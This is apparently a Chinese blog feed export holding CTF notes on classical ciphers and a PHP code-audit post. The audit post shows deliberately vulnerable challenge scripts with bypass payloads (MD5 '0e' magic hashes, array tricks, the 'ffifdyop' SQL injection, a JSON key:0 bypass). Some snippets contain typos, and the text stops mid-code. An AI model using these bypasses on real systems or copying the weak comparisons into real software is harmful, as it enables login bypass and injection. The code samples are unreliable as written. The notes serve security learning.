16进制表示方式前面加%u。Unescape解码/解密，就是去掉”%u”后，将16进制字符还原后，由UTF-16转码到自己目标字符。如:字符<strong>“中”</strong>，UTF-16BE是:<code>6d93</code>，因此Escape是“%u6d93”，反之也一样!因为目前%字符，常用作URL编码，所以%u这样编码已经逐渐被废弃了!</li></ul><h4 id="8-HTML实体编码"><a href="#8-HTML实体编码" class="headerlink" title="8. HTML实体编码"></a>8. HTML实体编码</h4><ul><li>查询网址： <a href="https://www.w3school.com.cn/tags/html_ref_entities.html" target="_blank" rel="noopener">https://www.w3school.com.cn/tags/html_ref_entities.html</a> </li></ul><h4 id="9-敲击码"><a href="#9-敲击码" class="headerlink" title="9.敲击码"></a>9.敲击码</h4><ul><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/敲击码.jpg" style="zoom: 50%;" /></li></ul><h4 id="10-摩尔斯密码"><a href="#10-摩尔斯密码" class="headerlink" title="10. 摩尔斯密码"></a>10. 摩尔斯密码</h4><ul><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/摩斯密码.jpg" style="zoom:50%;" /></li></ul><h4 id="11-盲文"><a href="#11-盲文" class="headerlink" title="11. 盲文"></a>11. 盲文</h4>  <img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/盲文.png" style="zoom:50%;" /><h4 id="12-置换类密码的简介"><a href="#12-置换类密码的简介" class="headerlink" title="12. 置换类密码的简介"></a>12. 置换类密码的简介</h4><ul><li>原理：置换是一个简单的换位操作，每个置换都可以用一个置换矩阵Ek来表示。每个置换都有一个与之对应的逆置换Dk。</li><li>置换密码的特点是仅有一个发送方和接受方知道的加密置换(用于加密)及对应的逆置换(用于解密)。它是对明文L长字母组中的字母位置进行重新排列，而每个字母本身并不改变。</li></ul><h4 id="13-列置换"><a href="#13-列置换" class="headerlink" title="13.列置换"></a>13.列置换</h4><ul><li>原理：加密将明文按固定长m分组，即<strong>每行m个字母</strong>，在密钥控制下按某一顺序<strong>交换列</strong>，最后按列优先的顺序依次读出，即产生了密文。</li><li>解密：逆过程。</li><li>解题时注意题目的提醒：todaygoodday，如果前面出现了，就把后面的去掉：todayg，按照字母顺序，结果为542163</li></ul><h4 id="14-周期置换"><a href="#14-周期置换" class="headerlink" title="14.周期置换"></a>14.周期置换</h4><ul><li>例：<ul><li>密钥：置换矩阵Ek= 1 234 5- -&gt; 2345 1</li><li>密文: ellcH orldw</li><li>明文为Hello world</li></ul></li></ul><h4 id="15-栅栏密码"><a href="#15-栅栏密码" class="headerlink" title="15.栅栏密码"></a>15.栅栏密码</h4><ul><li>原理：所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第一个字母连起来，形成一段无规律的密文。注意，栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。(一般不超过30个，也就是一、两句话)打开栅栏密码附件。</li><li>例1:<ul><li>密文: hrelldlioswmoe</li><li>明文就是:helloworldisme</li></ul></li></ul><h4 id="16-曲路密码"><a href="#16-曲路密码" class="headerlink" title="16.曲路密码"></a>16.曲路密码</h4><ul><li>曲路密码(Curve Cipher)是一种换位密码，需要事先双方约定密钥(也就是<strong>曲路路径</strong>)。</li><li>例：<img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/曲路密码.png" style="zoom: 50%;" /></li></ul><h4 id="17-代换密码简介"><a href="#17-代换密码简介" class="headerlink" title="17.代换密码简介"></a>17.代换密码简介</h4><ul><li>对明文进行替换，一一对应的关系</li></ul><h4 id="18-加法密码（凯撒）"><a href="#18-加法密码（凯撒）" class="headerlink" title="18.加法密码（凯撒）"></a>18.加法密码（凯撒）</h4><ul><li>凯撒密码就是典型的加法密码，用后面的第三个字母代替。</li><li>变异凯撒：</li></ul><h4 id="19-埃特巴什码"><a href="#19-埃特巴什码" class="headerlink" title="19.埃特巴什码"></a>19.埃特巴什码</h4><ul><li>原理：埃特巴什码(Atbash Cipher)是一种以字母倒序排列作为特殊密钥的替换加密，也就是下面的对应关系：</li><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/atbashCipher.png" style="zoom:50%;" /></li></ul><h4 id="20-乘法密码"><a href="#20-乘法密码" class="headerlink" title="20.乘法密码"></a>20.乘法密码</h4><ul><li>字符 * key (mod 26)</li><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/乘法密码.png" style="zoom:50%;" /></li></ul><ul><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/乘法密码——解密.png" style="zoom: 50%;" /></li></ul><h4 id="21-仿射密码"><a href="#21-仿射密码" class="headerlink" title="21.仿射密码"></a>21.仿射密码</h4><ul><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/仿射密码.png" style="zoom:50%;" /></li></ul><h4 id="22-密钥词组代替密码"><a href="#22-密钥词组代替密码" class="headerlink" title="22.密钥词组代替密码"></a>22.密钥词组代替密码</h4><ul><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/密钥词组替换.png" style="zoom:50%;" /></li></ul><h4 id="23-培根密码"><a href="#23-培根密码" class="headerlink" title="23.培根密码"></a>23.培根密码</h4><ul><li><p>培根密码表：有时，题目会用a代表大写，b代表小写</p></li><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/培根密码.png" style="zoom:50%;" /></li><li><pre class=" language-python"><code class="language-python">data<span class="token operator">=</span><span class="token string">'bacoNisoneofaMerICaSsWEethEartSitsAdARLinGSuCCuLEntf0oDtHAtPaIRsFlawLE'</span>cipher <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> x <span class="token keyword">in</span> data<span class="token punctuation">:</span>    x <span class="token operator">=</span> ord<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token keyword">if</span> x<span class="token operator">&lt;=</span><span class="token number">90</span> <span class="token operator">and</span>  x<span class="token operator">>=</span><span class="token number">65</span> <span class="token punctuation">:</span>        cipher <span class="token operator">+=</span> <span class="token string">'b'</span>    <span class="token keyword">else</span> <span class="token punctuation">:</span>        cipher <span class="token operator">+=</span> <span class="token string">'a'</span><span class="token keyword">print</span> cipher</code></pre></li></ul><h4 id="24-ROT系列"><a href="#24-ROT系列" class="headerlink" title="24.ROT系列"></a>24.ROT系列</h4><ul><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/rot.png" style="zoom:50%;" /></li></ul><h4 id="25-猪圈密码"><a href="#25-猪圈密码" class="headerlink" title="25.猪圈密码"></a>25.猪圈密码</h4><ul><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/猪圈密码.png" style="zoom:50%;" /></li><li>密码表：</li></ul><img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/猪圈密码——密码表.png" style="zoom:33%;" /><h4 id="26-Vernam-密码（维吉尼亚密码）"><a href="#26-Vernam-密码（维吉尼亚密码）" class="headerlink" title="26.Vernam 密码（维吉尼亚密码）"></a>26.Vernam 密码（维吉尼亚密码）</h4><ul><li>密码表：<img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/维吉尼亚密码.png" style="zoom:50%;" /></li><li>明文是横行，密钥是列，密文是表格中的位置</li></ul><h4 id="27-希尔密码"><a href="#27-希尔密码" class="headerlink" title="27.希尔密码"></a>27.希尔密码</h4><ul><li>希尔密码(HillCipher)是运用基本矩阵论原理的替换密码，由LesterS. Hill在1929年发明。每个字母当作26进制数字: A=0, B=1, C=2…一串字母当成n维向量，跟一个n X n的矩阵（密钥）相乘，再将得出的结果MOD 26。</li><li>知道密文和密钥  找 逆矩阵 ？？</li><li><a href="https://www.cryptool.org/en/" target="_blank" rel="noopener">https://www.cryptool.org/en/</a></li></ul><h4 id="28-playfair-cipher（公平的玩）"><a href="#28-playfair-cipher（公平的玩）" class="headerlink" title="28.playfair cipher（公平的玩）"></a>28.playfair cipher（公平的玩）</h4><ul><li>原理：波雷费密码(英语: Playfair cipher)是一种对称式密码，是首种双字母取代的加密法。选取一个英文字作密钥。除去重复出现的字母。将密钥的字母逐个逐个加入5X 5的矩阵内，剩下的空间将未加入的英文字母依a-z的顺序加入。(将Q去除， 或将I和J视作同一字。)将要加密的讯息分成两个一组。若组内的字母相同，将X (或Q)加到该组的第一个字母后，重新分组。若剩下一个字，也加入X字。在每组中，找出两个字母在矩阵中的地方。</li></ul><h4 id="29-波利比奥斯方阵密码"><a href="#29-波利比奥斯方阵密码" class="headerlink" title="29.波利比奥斯方阵密码"></a>29.波利比奥斯方阵密码</h4><ul><li><p>波利比奧斯方阵密码(PolybiusSquareCipher或称波利比奥斯棋盘)是棋盘密码的一种，是利用波利比奧斯方阵进行加密的密码方式，简单的来说就是把字母排列好，用坐标(行列)的形式表现出来。字母是密文，明文便是字母的坐标。</p></li><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/波利比奥斯密码.png" style="zoom:50%;" /></li></ul><h4 id="30-ADFGX密码"><a href="#30-ADFGX密码" class="headerlink" title="30.ADFGX密码"></a>30.ADFGX密码</h4><ul><li>ADFGX密码(ADFGX Cipher)是结合了改良过的Polybius方格替代密码与单行换位密码的矩阵加密密码，使用了5个合理的密文字母:A，D，F，G，X，这些字母之所以这样选择是因为当转译成摩尔斯电码(ADFGX密码是德国军队在一战发明使用的密码)不易混淆，目的是尽可能减少转译过程的操作错误。</li><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/ADFGV.png" style="zoom:50%;" /></li></ul><img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/ADFGV-2.png" style="zoom:50%;" /><h4 id="31-ADFGVX密码"><a href="#31-ADFGVX密码" class="headerlink" title="31.ADFGVX密码"></a>31.ADFGVX密码</h4><ul><li>ADFGVX密码实际上就是ADFGX密码的扩充升级版，一样具有ADFGX密码相同的特点，加密过程也类似，不同的是密文字母增加了V,使得可以再使用10数字来替换明文。</li><li>通过题目给的明文，计算得到 对应的棋盘密码表</li><li><a href="https://xz.aliyun.com/t/3603" target="_blank" rel="noopener">https://xz.aliyun.com/t/3603</a></li><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/ADFGVX.png" style="zoom:50%;" /></li></ul><img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/ADFGVX-3.png" style="zoom:50%;" /><h4 id="31-双密码"><a href="#31-双密码" class="headerlink" title="31.双密码"></a>31.双密码</h4><ul><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/双密码.png" style="zoom:50%;" /></li></ul><h4 id="32-三分密码"><a href="#32-三分密码" class="headerlink" title="32.三分密码"></a>32.三分密码</h4><ul><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/三分密码.png" style="zoom:50%;" /></li><li>密码表：<img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/三分密码-2.png" style="zoom:50%;" /></li><li>例子：<img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/三分密码-3.png" style="zoom:50%;" /></li></ul><h4 id="33-四方密码"><a href="#33-四方密码" class="headerlink" title="33.四方密码"></a>33.四方密码</h4><ul><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/四方密码.png" style="zoom:50%;" /></li><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/四方密码-2.png" style="zoom:50%;" /></li><li>密码表：<img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/四方密码-3.png" style="zoom:50%;" /></li></ul><h4 id="34-二方密码"><a href="#34-二方密码" class="headerlink" title="34.二方密码"></a>34.二方密码</h4><ul><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/二方密码.png" style="zoom:50%;" /></li><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/二方密码-2.png" style="zoom:50%;" /></li><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/二方密码-4.png" style="zoom:50%;" /></li><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/二方密码-3.png" style="zoom:50%;" /></li></ul><h4 id="35-自动密钥密码"><a href="#35-自动密钥密码" class="headerlink" title="35.自动密钥密码"></a>35.自动密钥密码</h4><ul><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/自动密钥密码.png" style="zoom:50%;" /></li></ul><h4 id="36-博福特密码"><a href="#36-博福特密码" class="headerlink" title="36.博福特密码"></a>36.博福特密码</h4><ul><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/博福特密码.png" style="zoom:50%;" /></li><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/博福特密码-2.png" style="zoom:50%;" /></li></ul><h4 id="37-滚动密钥密码"><a href="#37-滚动密钥密码" class="headerlink" title="37.滚动密钥密码"></a>37.滚动密钥密码</h4><ul><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/滚动密钥密码.png" style="zoom:50%;" /></li></ul><h4 id="38-Porta密码"><a href="#38-Porta密码" class="headerlink" title="38.Porta密码"></a>38.Porta密码</h4><ul><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/Porta密码.png" style="zoom:50%;" /></li><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/Prato密码-2.png" style="zoom:50%;" /></li></ul><h4 id="39-词频分析"><a href="#39-词频分析" class="headerlink" title="39.词频分析"></a>39.词频分析</h4><ul><li><p><a href="https://quipqiup.com/" target="_blank" rel="noopener">https://quipqiup.com/</a></p></li><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/mima/词频分析.png" style="zoom:50%;" /></li></ul><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://www.cnblogs.com/mq0036/p/6544055.html" target="_blank" rel="noopener">https://www.cnblogs.com/mq0036/p/6544055.html</a> </li><li>python库：pycipher</li><li>base64： <a href="https://www.cnblogs.com/peterYong/p/10959964.html" target="_blank" rel="noopener">https://www.cnblogs.com/peterYong/p/10959964.html</a> </li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计</title>
      <link href="/2020/03/26/php-dai-ma-shen-ji/"/>
      <url>/2020/03/26/php-dai-ma-shen-ji/</url>
      
        <content type="html"><![CDATA[<h3 id="PHP代码审计"><a href="#PHP代码审计" class="headerlink" title="PHP代码审计"></a>PHP代码审计</h3><h4 id="1-弱类型及MD5"><a href="#1-弱类型及MD5" class="headerlink" title="1.弱类型及MD5"></a>1.弱类型及MD5</h4><ul><li><p><code>$a==$b</code>：等于true，“如果类型转换”后$a等于$b</p></li><li><p><code>$a===$b</code>：全等true，除了值相等，类型也相等</p><ul><li>注意：如果一个数值和一个字符串比较，那么会将字符串转换为数值</li></ul></li><li><p><code>strcmp</code>：二进制安全字符串比较（第一个减第二个），转化为ASCII后逐字节比较，然后根据运算结果来决定返回值</p></li><li><p><code>in_array</code>：检查数组中是否存在某个值，返回bool值，比较不严格</p></li><li><p><code>array_search</code>：类似于<strong>in_array</strong>，找到了就返回键，如果strict没有设置，那就使用弱类型的比较（字符串等于0）</p></li><li><p><code>strpos</code>：查找字符串首次出现的位置，返回值为int型</p></li><li><p>出错点：</p></li></ul><pre><code>&#39;&#39;==0==false                    //空  ==  0  ==  false[&#39;&#39;]==[0]==[false]==[null]        //与第一个类似&#39;123&#39;==123                        //字符123就变成123&#39;abc&#39;==0                        //字符串被转换为0（null）&#39;123a&#39;==123                        //字符a会被忽略      //因为常规字符串是以0开头的&#39;0x01&#39;==1                        //十六进制的1就变成1&#39;0e123456789&#39;==&#39;0e987654321&#39;    //因为0的任何次方都是0&#39;null&#39;==&#39;false&#39;==0true == 1（非零）</code></pre><ul><li>常见题目：</li></ul><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_error"</span><span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param1'</span><span class="token punctuation">]</span><span class="token operator">!=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param2'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"success"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"fail"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//此处要求param1与param2的值不同，但是md5相同</span><span class="token comment" spellcheck="true">//思路：</span><span class="token comment" spellcheck="true">//       1.找到MD5相同但文件不同的文件 </span><span class="token comment" spellcheck="true">//       2.不去考虑MD5，而是考虑MD5计算完成后的结果，利用弱类型比较。此处使用md5对字符串计算后结果为0e开头的例子。        可用的值为：</span>        <span class="token comment" spellcheck="true">//QNKCDZO  ：  0e830400451993494058024219903391</span>        <span class="token comment" spellcheck="true">//s878926199a  ：  0e545993274517709034328855841020</span>        <span class="token comment" spellcheck="true">//s214587387a  ：  0e848240448830537924465865611904</span>        <span class="token comment" spellcheck="true">//payload ： prarm1=QNKCDZO&amp;param2=s878926199a</span><span class="token comment" spellcheck="true">//         3.利用md5函数的返回值：md5计算数组，返回值都为string（php比较时转换为null），所以，传入两个数组也可以达到效果</span>        <span class="token comment" spellcheck="true">//payload ： prarm1[]=1&amp;param2[]=</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_error"</span><span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param1'</span><span class="token punctuation">]</span><span class="token operator">!==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param2'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"fail"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//此处为强类型比较，三个‘=’</span><span class="token comment" spellcheck="true">//直接使用MD5函数对数组计算结果为null的方法</span><span class="token comment" spellcheck="true">//payload ： prarm1[]=1&amp;param2[]=</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_error"</span><span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param1'</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"param2"</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"flagxxxxxxxxxx}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"fail"</span> <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//此时如果再使用第二步的传入数组的方法，就不行了，</span><span class="token comment" spellcheck="true">//因为，post传值后，被强制转换为了string类型的字符串：Array</span><span class="token comment" spellcheck="true">//使用fastcoll工具，传入一个文件，生成两个MD5值一样的文件</span><span class="token comment" spellcheck="true">//将文件的内容使用python3的urllib库中的parse方法读取出来，作为参数值传进去即可</span><span class="token comment" spellcheck="true">//hackbar可能会出错，使用bp最靠谱</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//这是一个sha1算法的例子</span><span class="token delimiter">&lt;?php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_error"</span><span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">"flag"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token keyword">and</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">echo</span>  <span class="token string">'&lt;p>Your password can not be your name!&lt;/p>'</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Flag: '</span> <span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">echo</span><span class="token string">' &lt;p>Invalid password.&lt;/p>'</span> <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token keyword">echo</span>  <span class="token string">'&lt;p>Login first!&lt;/p>'</span> <span class="token punctuation">;</span><span class="token comment" spellcheck="true">//要求：账号密码不相等，但sha1加密后相等</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//md5与sql注入的融合</span><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$link</span> <span class="token operator">=</span> <span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">,</span><span class="token string">'root'</span><span class="token punctuation">,</span><span class="token string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Could not connect to MySQL:'</span><span class="token punctuation">.</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$db</span><span class="token operator">=</span><span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'select db error'</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM admin WHERE pass = '"</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token string">"'"</span><span class="token punctuation">;</span><span class="token shell-comment comment">#var_dump($sq1);</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysq1_query</span><span class="token punctuation">(</span><span class="token variable">$sq1</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'&lt;pre>'</span><span class="token punctuation">.</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'&lt;/pre>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row1</span> <span class="token operator">=</span> <span class="token function">mysq1_fetch_row</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$row1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mysql_close</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//此处为sql注入，应该找一个字符串，该字符串经过MD5计算后会生成以单引号（功能为闭合前一个单引号）为开头的字符出，该字符串为"ffifdyop"</span><span class="token comment" spellcheck="true">//payload : password=ffifdyop</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//json 相关问题：</span><span class="token delimiter">&lt;?php</span><span class="token function">highight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$message</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">key</span> <span class="token operator">==</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//此处判断使用的是双等于号</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"fail"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"----"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//$key未知</span><span class="token comment" spellcheck="true">//注意：非0开头字符串的字符串会被识别为 0 ，</span><span class="token comment" spellcheck="true">//payload ： message={"key":0}</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//switch相关问题：</span><span class="token delimiter">&lt;?php</span><span class="token function">highiight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span 